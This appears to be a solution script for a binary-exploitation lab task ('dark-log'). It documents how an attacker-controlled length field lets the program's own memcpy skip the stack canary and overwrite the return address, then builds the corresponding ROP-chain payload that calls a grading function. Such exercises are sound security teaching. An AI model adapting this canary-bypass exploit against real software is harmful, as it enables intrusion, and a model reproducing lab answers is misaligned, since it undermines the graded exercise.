#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (canary + NX + ASLR).

struct log_frame {
    char expression[128];   // rbp-0x120
    char logMsg[128];       // rbp-0xa0
    int  len;               // rbp-0x20   <- attacker-controlled
    char pad[8];
};

The canary sits at rbp-0x08, between the struct and the saved rbp.
We cannot write past it with gets(), but we do not need to:

  * gets() writes 260 bytes, i.e. through `len`, stopping 20 bytes
    before the canary;
  * we set len = 0xa0 = 160, so the program's own
        memcpy(logMsg + len, expression, 128)
    writes expression[0..127] to rbp..rbp+127 -- *starting at the saved
    rbp*, thereby skipping the canary entirely;
  * the canary is therefore still intact when it is checked, while the
    return address has become expression[8..15].

expression[8..] is a short ROP chain: pop rdi; 4; ret; grade_eval; ret.
"""
import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def p32(value: int) -> bytes:
    return struct.pack("<I", value)


payload = b"\x00" * 8                       # fake saved rbp
payload += p64(0x4018A3)                    # pop rdi; ret
payload += p64(4)                           # edi = 4
payload += p64(0x4018A4)                    # ret (16-byte stack alignment)
payload += p64(0x401677)                    # grade_eval(4)
payload += p64(0x4018A4)                    # ret
payload += p64(0)                           # crash *after* grade_eval flushes
payload = payload.ljust(256, b"\x00")       # expression[128] + logMsg[128]
payload += p32(0xA0)                        # len = 160 -> memcpy dest = rbp

sys.stdout.buffer.write(payload)
